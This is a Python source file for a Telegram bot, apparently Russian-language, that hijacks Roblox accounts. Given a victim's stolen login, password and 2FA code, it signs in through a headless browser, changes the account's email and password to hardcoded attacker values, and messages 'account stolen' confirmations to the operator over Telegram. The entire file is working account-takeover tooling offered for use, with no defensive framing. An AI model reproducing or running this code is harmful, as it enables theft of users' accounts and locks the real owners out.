import telebot
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')
bot = telebot.TeleBot(BOT_TOKEN)

def steal_account(username, password, twofa=''):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    try:
        driver.get("https://www.roblox.com/login")
        wait = WebDriverWait(driver, 20)
        login_input = wait.until(EC.presence_of_element_located((By.ID, "login-username")))
        login_input.send_keys(username)
        password_input = driver.find_element(By.ID, "login-password")
        password_input.send_keys(password)
        driver.find_element(By.ID, "login-button").click()
        if twofa:
            try:
                twofa_input = wait.until(EC.presence_of_element_located((By.NAME, "code")))
                twofa_input.send_keys(twofa)
                driver.find_element(By.XPATH, "//button[contains(text(),'Verify')]").click()
            except:
                pass
        wait.until(EC.presence_of_element_located((By.XPATH, "//a[@href='/my/account']")))
        driver.get("https://www.roblox.com/my/account")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "email")))
        email_input.clear()
        email_input.send_keys("whyy7775@gmail.com")
        old_pass = driver.find_element(By.ID, "oldPassword")
        old_pass.send_keys(password)
        new_pass1 = driver.find_element(By.ID, "newPassword")
        new_pass1.send_keys("zxcvalna10101")
        new_pass2 = driver.find_element(By.ID, "confirmNewPassword")
        new_pass2.send_keys("zxcvalna10101")
        driver.find_element(By.XPATH, "//button[contains(text(),'Save')]").click()
        time.sleep(3)
        result = f"✅ Аккаунт украден!\nЛогин: {username}\nНовый пароль: zxcvalna10101\nПочта изменена на whyy7775@gmail.com"
        bot.send_message(ADMIN_ID, result)
        return True
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ Ошибка: {str(e)}")
        return False
    finally:
        driver.quit()

@bot.message_handler(commands=['steal'])
def handle_steal(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Формат: /steal username password [2fa]")
        return
    username = parts[1]
    password = parts[2]
    twofa = parts[3] if len(parts) > 3 else ""
    bot.reply_to(message, f"Запускаю кражу для {username}...")
    steal_account(username, password, twofa)

def run_steal(username, password, twofa):
    steal_account(username, password, twofa)